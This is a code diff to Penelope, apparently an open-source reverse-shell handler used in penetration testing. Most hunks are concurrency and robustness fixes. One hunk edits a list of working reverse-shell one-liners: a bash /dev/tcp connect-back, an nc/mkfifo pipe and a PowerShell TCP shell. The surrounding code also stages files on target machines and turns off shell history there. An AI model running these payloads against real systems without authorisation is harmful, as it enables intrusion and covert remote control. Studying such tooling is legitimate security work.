@@ -954,6 +954,10 @@ class MainMenu(BetterCMD):
 						else:
 							cmdlogger.warning("No available sessions to perform this action")
 						return False
+					if self.sid not in core.sessions:
+						cmdlogger.warning(f"Session {self.sid} is no longer active")
+						self.set_id(None)
+						return False
 				else:
 					if ID:
 						if ID.isnumeric() and int(ID) in core.sessions:
@@ -1858,7 +1862,9 @@ class MainMenu(BetterCMD):
 		if re.search(r'(?:^|\s)(?:-o|--output)\s*$', line[:begidx]):
 			return self.complete_path(line, begidx, endidx, self._local_lister,
 				expand=lambda p: os.path.expandvars(os.path.expanduser(p)))
-		session = core.sessions[self.sid]
+		session = core.sessions.get(self.sid)
+		if session is None:
+			return []
 		return self.complete_path(line, begidx, endidx, session.get_remote_completion,
 			windows=(session.OS == 'Windows'))
 
@@ -2132,30 +2138,29 @@ class Core:
 						break
 					readable.bytes_received += len(data)
 
-					# TODO need thread sync
-					target = readable.shell_response_buf\
-					if not readable.subchannel.active\
-					and readable.subchannel.allow_receive_shell_data\
-					else readable.subchannel
+					with readable.data_route_lock:
+						target = readable.subchannel\
+						if readable.subchannel.active\
+						else readable.shell_response_buf
 
-					if readable.agent:
-						for _type, _value in readable.messenger.feed(data):
-							#print(_type, _value)
-							if _type == Messenger.SHELL:
-								if not _value: # TEMP
-									readable.kill()
-									break
-								target.write(_value)
+						if readable.agent:
+							for _type, _value in readable.messenger.feed(data):
+								#print(_type, _value)
+								if _type == Messenger.SHELL:
+									if not _value: # TEMP
+										readable.kill()
+										break
+									target.write(_value)
 
-							elif _type == Messenger.STREAM:
-								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
-								#print((repr(stream_id), repr(data)))
-								try:
-									readable.streams[stream_id] << data
-								except (OSError, KeyError):
-									logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")
-					else:
-						target.write(data)
+								elif _type == Messenger.STREAM:
+									stream_id, stream_data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
+									#print((repr(stream_id), repr(stream_data)))
+									try:
+										readable.streams[stream_id] << stream_data
+									except (OSError, KeyError):
+										logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")
+						else:
+							target.write(data)
 
 					shell_output = readable.shell_response_buf.getvalue() # TODO
 					if shell_output:
@@ -2408,7 +2413,7 @@ class TCPListener:
 		presets = [
 			"(bash >& /dev/tcp/{}/{} 0>&1) &",
 			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
-			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = [Text.Encoding]::UTF8.GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = [Text.Encoding]::UTF8.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Adapted from revshells.com
+			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
 		output = [str(paint(self).white_MAGENTA)]
@@ -2462,7 +2467,6 @@ class Channel:
 		self._read, self._write = os.pipe()
 		self.can_use = True
 		self.active = True
-		self.allow_receive_shell_data = True
 		self.control = ControlQueue()
 
 	def fileno(self):
@@ -2518,6 +2522,7 @@ class Session:
 			self.last_lines = LineBuffer(options.attach_lines)
 			self.lock = threading.Lock()
 			self.wlock = threading.Lock()
+			self.data_route_lock = threading.Lock()
 			self.log_lock = threading.Lock()
 			self.logfile = io.BytesIO()
 
@@ -2632,7 +2637,11 @@ class Session:
 					self.listener.stop()
 
 				if hasattr(listener_menu, 'active') and listener_menu.active:
-					os.close(listener_menu.control_w)
+					try:
+						os.close(listener_menu.control_w)
+					except OSError:
+						pass
+					listener_menu.control_w = None
 					listener_menu.finishing.wait()
 
 				attach_conditions = [
@@ -2770,10 +2779,8 @@ class Session:
 			self.systeminfo = self.exec('systeminfo', value=True)
 			if not self.systeminfo:
 				return False
-
-			if (not "\n" in self.systeminfo) and ("OS Name" in self.systeminfo): #TODO TEMP PATCH
-				self.exec("cd", force_cmd=True, raw=True)
-				return False
+			self.systeminfo = self.systeminfo.replace('\r\n', '\n').replace('\r', '\n')
+			self.systeminfo = re.sub(r'\x1b\[[0-?]*[ -/]*[@-~]', '', self.systeminfo)
 
 			def extract_value(pattern):
 				match = re.search(pattern, self.systeminfo, re.MULTILINE)
@@ -2840,8 +2847,11 @@ class Session:
 						return False
 
 			elif self.OS == 'Windows':
-				write_test_file = f"{directory}\\{rand(16)}.tmp"
-				cmd = f'type nul > {write_test_file} 2>nul && (echo OK) || (echo NO) & del {write_test_file} 2>nul'
+				write_test_file = str(PureWindowsPath(directory) / f"{rand(16)}.tmp")
+				cmd = (
+					f'type nul > "{write_test_file}" 2>nul && (echo OK) || (echo NO) '
+					f'& del /f /q "{write_test_file}" 2>nul'
+				)
 				response = self.exec(cmd, force_cmd=True, value=True)
 				if response != "OK":
 					logger.error(f"{directory}: Access is denied.")
@@ -3096,8 +3106,6 @@ class Session:
 			self.outbuf.seek(0, io.SEEK_END)
 			_len = self.outbuf.write(data)
 
-			self.subchannel.allow_receive_shell_data = True
-
 			if self not in core.wlist:
 				core.wlist.append(self)
 				if not stdin:
@@ -3182,6 +3190,15 @@ class Session:
 				if not options.keep_history:
 					self.exec("export HISTFILE=/dev/null HISTCONTROL=ignorespace 2>/dev/null")
 
+			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
+					re.search(r'PS[^\r\n]*>', response, re.DOTALL):
+				self.OS = 'Windows'
+				self.type = 'Raw'
+				self.subtype = 'psh'
+				self.interactive = True
+				self.echoing = False
+				self.prompt = response.splitlines()[-1].encode()
+
 			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
 					re.search('Microsoft Windows.*>', response, re.DOTALL) or \
 					re.search(r'(?<!PS )[A-Za-z]:\\[^\r\n]*>\s*$', response):
@@ -3196,28 +3213,21 @@ class Session:
 				if win_version:
 					self.win_version = win_version[1]
 
-			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
-					re.search(r'PS[^\r\n]*>', response, re.DOTALL):
-				self.OS = 'Windows'
-				self.type = 'Raw'
-				self.subtype = 'psh'
-				self.interactive = True
-				self.echoing = False
-				self.prompt = response.splitlines()[-1].encode()
 		else:
 			return False
 
 		if self.OS == 'Windows' and response and '\x1b' in response:
 			self.type = 'PTY'
 			self.echoing = True
-			columns, lines = shutil.get_terminal_size()
-			cmd = (
-				f"$width={columns}; $height={lines}; "
-				"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
-				"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
-				"-ArgumentList ($width, $height)"
-			)
-			self.exec(cmd)
+			if self.subtype == 'psh':
+				columns, lines = shutil.get_terminal_size()
+				cmd = (
+					f"$width={columns}; $height={lines}; "
+					"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
+					"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
+					"-ArgumentList ($width, $height)"
+				)
+				self.exec(cmd)
 			self.prompt = response.split()[-1].encode()
 
 		self.get_shell_info(silent=True)
@@ -3405,10 +3415,13 @@ class Session:
 						continue
 					break
 
-				stdin_stream << b"" # TOCHECK
-				stdin_stream.write(b"")
-				stdin_stream.close_read()
-				del self.streams[stdin_stream.id]
+				try:
+					stdin_stream.write(b"")
+				except OSError:
+					pass
+				for stream in (stdin_stream, stdout_stream, stderr_stream):
+					stream.close()
+					self.streams.pop(stream.id, None)
 
 				return buffer.getvalue().rstrip().decode(errors="replace") if value else True
 			return None
@@ -3420,7 +3433,8 @@ class Session:
 				return False
 
 			self.subchannel.control.clear()
-			self.subchannel.active = True
+			with self.data_route_lock:
+				self.subchannel.active = True
 			self.subchannel.result = None
 			buffer = io.BytesIO()
 			_start = time.perf_counter()
@@ -3482,7 +3496,6 @@ class Session:
 				if self.agent and agent_typing:
 					cmd = Messenger.message(Messenger.SHELL, cmd)
 				self.send(cmd)
-				self.subchannel.allow_receive_shell_data = False # It works but maybe needs better sync
 
 			data_timeout = self.timeout_short if timeout is False else timeout
 			continuation_timeout = options.latency
@@ -3572,19 +3585,29 @@ class Session:
 					self.subchannel.result = re.sub(rb'\x1b\[(?:K|\?25h|25l|82X)', b'', self.subchannel.result)
 				self.subchannel.result = self.subchannel.result.strip().decode(errors="replace") # TODO check strip
 			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
-			self.subchannel.active = False
-			self.subchannel.allow_receive_shell_data = True
 
-			if separate and self.subchannel.result:
+			if separate:
+				if not self.subchannel.result:
+					with self.data_route_lock:
+						self.subchannel.active = False
+					return False
 				marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
 				idx = self.subchannel.result.find(marker, Messenger.LEN_BYTES)
 				if idx < 0:
+					with self.data_route_lock:
+						self.subchannel.active = False
 					return False
-				self.subchannel.result = self.subchannel.result[idx - Messenger.LEN_BYTES:]
+				framed_result = self.subchannel.result[idx - Messenger.LEN_BYTES:]
 				buffer = io.BytesIO()
-				for _type, _value in self.messenger.feed(self.subchannel.result):
+				for _type, _value in self.messenger.feed(framed_result):
 					buffer.write(_value)
+				with self.data_route_lock:
+					self.agent = True
+					self.subchannel.active = False
 				return buffer.getvalue()
+
+			with self.data_route_lock:
+				self.subchannel.active = False
 
 			return self.subchannel.result
 
@@ -3748,7 +3771,6 @@ class Session:
 
 				logger.info(f"{EMOJIS['agent']} Agent deployed via {paint(_bin).green}")
 
-				self.agent = True
 				self.type = 'PTY'
 				self.interactive = True
 				self.echoing = True
@@ -4059,7 +4081,11 @@ class Session:
 				tar_source, mode = stdout_stream, "r|gz"
 			else:
 				remote_items = ' '.join([shell_escape_glob(os.path.join(self.cwd, part)) for part in shlex.split(remote_items)])
-				temp = self.tmp + "/" + rand(8)
+				remote_tmp = self.tmp
+				if not remote_tmp:
+					logger.error("No writable directory available on target for download staging")
+					return []
+				temp = remote_tmp + "/" + rand(8)
 				cmd = rf'tar -czf - {"-h " if options.link_dereference else ""}{remote_items}|base64|tr -d "\n" > {temp}'
 				response = self.exec(cmd, timeout=None, value=True)
 				if response is False:
@@ -4538,7 +4564,11 @@ class Session:
 				tar_buffer.seek(0)
 				raw = tar_buffer.read()
 				data = base64.b64encode(raw).decode()
-				temp = self.tmp + "/" + rand(8)
+				remote_tmp = self.tmp
+				if not remote_tmp:
+					logger.error("No writable directory available on target for upload staging")
+					return []
+				temp = remote_tmp + "/" + rand(8)
 
 				logger.trace(paint(f"⇥ Uploading to {destination}").cyan)
 				pbar = PBar(len(raw), caption=f" {paint('⤷').softorange} ", barlen=30, metric=Size)
@@ -4831,7 +4861,7 @@ class Session:
 				import socket
 				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 				try:
-					client.connect(("{rhost}", {rport}))
+					client.connect(({rhost!r}, {int(rport)}))
 					connected = True
 				except socket.error:
 					connected = False
@@ -5827,7 +5857,10 @@ class ngrok(Module):
 			if session.arch != 'x86_64':
 				logger.error(f"No prebuilt ngrok binary for arch '{session.arch}'")
 				return False
-			upload_single_from_archive(session, URLS['ngrok_linux'], "ngrok", "ngrok", remote_path=session.exec_tmp)
+			uploaded = upload_single_from_archive(session, URLS['ngrok_linux'], "ngrok", "ngrok", remote_path=session.exec_tmp)
+			if not uploaded:
+				logger.error("Failed to upload ngrok")
+				return False
 
 			token = input("Authtoken: ")
 			session.exec(f"{session.exec_tmp}/ngrok config add-authtoken {token}")
@@ -6591,6 +6624,11 @@ def custom_excepthook(*args):
 		exc_type, exc_value, exc_traceback = args
 	else:
 		return
+	try:
+		restore_tty()
+		os.write(sys.stdout.fileno(), b"\x1b[?25h")
+	except (OSError, termios.error):
+		pass
 	print("\n", paint('Oops...').RED, f'{EMOJIS["bug"]}\n', paint().yellow, '─' * 80, sep='')
 	sys.__excepthook__(exc_type, exc_value, exc_traceback)
 	print('─' * 80, f"\n{paint('Penelope version:').red} {paint(__version__).green}")
@@ -6923,7 +6961,14 @@ def listener_menu():
 	restore_tty()
 	stdout(b"\x1b[?25h\r")
 	func()
-	os.close(listener_menu.control_r)
+	for fd_name in ('control_r', 'control_w'):
+		fd = getattr(listener_menu, fd_name, None)
+		if fd is not None:
+			try:
+				os.close(fd)
+			except OSError:
+				pass
+			setattr(listener_menu, fd_name, None)
 	listener_menu.active = False
 	listener_menu.finishing.set()
 	return True
@@ -7074,9 +7119,10 @@ class Options:
 				EMOJIS = _EMOJIS_FULL if value else defaultdict(str)
 
 
-		if hasattr(self, option) and getattr(self, option) is not None:
+		stored_value = self.__dict__.get(option)
+		if option in self.__dict__ and stored_value is not None:
 			new_value_type = type(value).__name__
-			orig_value_type = type(getattr(self, option)).__name__
+			orig_value_type = type(stored_value).__name__
 			if new_value_type == orig_value_type:
 				self.__dict__[option] = value
 			else:
